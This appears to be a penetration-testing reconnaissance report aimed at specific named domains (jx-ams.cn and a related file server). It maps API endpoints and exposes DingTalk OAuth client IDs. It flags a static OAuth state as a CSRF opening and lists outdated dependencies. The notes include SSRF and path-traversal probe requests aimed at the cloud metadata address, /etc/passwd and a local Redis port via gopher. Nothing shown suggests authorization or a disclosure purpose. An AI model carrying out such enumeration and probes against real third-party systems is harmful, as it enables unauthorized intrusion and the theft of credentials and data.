# jx-ams.cn API Enumeration & DingTalk OAuth Analysis

## cop.jx-ams.cn Full API Endpoint Map

### Unauthenticated (code 1000 or 302)
```
GET  /api/sys/ftp/file/signDownlaodUrl?fileKey=X  → 302 to cpfile-test.yqcx.faw.cn/X?e=<ts>&token=<hmac>
GET  /api/sys/sys/dingTalk/auth                    → {"msg":"authCode is required","code":1000}
POST /api/sys/sys/dingTalk/auth                    → {"msg":"服务异常","code":5000}
GET  /                                              → 302 to /login (SPA)
```

### TOKEN-protected (code 12000)
```
/api/sys/{user/list, config, menu, dept, role, dict, log, online, session}
/api/{workflow/, finance/}
/api/sys/common/getCode
/api/sys/common/getDictItems
/api/sys/user/queryByUserName
/api/sys/{ftp, attachment, sms, email, message, notice, bulletin}
/api/sys/{schedule, task, job, cron, timer}
/api/sys/{gen, code, template, report}
/api/sys/{area, region, city, province, country}
/api/sys/{org, company, dept, position}
/api/sys/{permission, perm, access, auth}
/api/sys/{file, attachment, upload, download}
/api/monitor/{health, info, metrics, trace, loggers, env, beans, configprops, mappings, threaddump, heapdump, jolokia, auditevents}
```

### OPTIONS method behavior
- /api/sys/ftp/file/signDownlaodUrl → 1006 (not logged in, different middleware!)
- /api/sys/sys/dingTalk/auth → 1006 (not logged in)
- All other /api/sys/* → 12000 (TOKEN invalid)

## cop-risk.jx-ams.cn API Endpoints
All return code 1006 (用户没有登录或登录已失效):
```
/api/{auth/login, user/info, user/current, risk/list, risk/query}
/api/{order/list, config, system/info, version, common/*}
/api/{file/*, upload, export, dashboard, statistics, report}
```

## DingTalk OAuth Flow (cop.jx-ams.cn)

### Configuration (from browser iframe inspection)
```
https://login.dingtalk.com/oauth2/auth?
  iframe=true
  &redirect_uri=https%3A%2F%2Fcop.jx-ams.cn%2Fapi%2Fsys%2Fsys%2FdingTalk%2Fauth
  &response_type=code
  &client_id=dingas4bawefhdn7ixq4
  &scope=openid
  &prompt=consent
  &state=xxxxxxxxx        ← STATIC! CSRF risk
```

### DingTalk App Keys Found
- cop.jx-ams.cn: `dingas4bawefhdn7ixq4`
- oa.jx-ams.cn: `dingoambfbga0peamatkde`

### Attack Considerations
- State parameter is static → attacker can pre-craft OAuth callback URL
- DingTalk shows challenge page before redirect (mitigates redirect_uri hijack)
- authCode is single-use and short-lived → no replay risk
- Backend always returns 5000 for any authCode → error handling is generic

## File Download SSRF/Path Traversal
```
GET /api/sys/ftp/file/signDownlaodUrl?fileKey=http://169.254.169.254/latest/meta-data/
→ 302: https://cpfile-test.yqcx.faw.cn/http://169.254.169.254/latest/meta-data/?e=...&token=...

GET /api/sys/ftp/file/signDownlaodUrl?fileKey=../../../etc/passwd
→ 302: https://cpfile-test.yqcx.faw.cn/../../../etc/passwd?e=...&token=...

GET /api/sys/ftp/file/signDownlaodUrl?fileKey=gopher://127.0.0.1:6379/
→ 302: https://cpfile-test.yqcx.faw.cn/gopher://127.0.0.1:6379/?e=...&token=...
```
File server always returns 401 for direct access. Token is HMAC-based.
The SSRF/path traversal is passed through to the redirect URL but the file server blocks it.

## Frontend Dependencies (outdated)
- Vue 2.6.10 (2019, EOL)
- axios 0.19.0 (2020)
- Element UI 2.13.2 (2020)
- moment.js 2.24.0 (prototype pollution CVE)
- nginx/1.15.5 (2018, multiple CVEs)
- cop-risk: Vue 3.3.4 + Element Plus 2.3.7/2.4.3
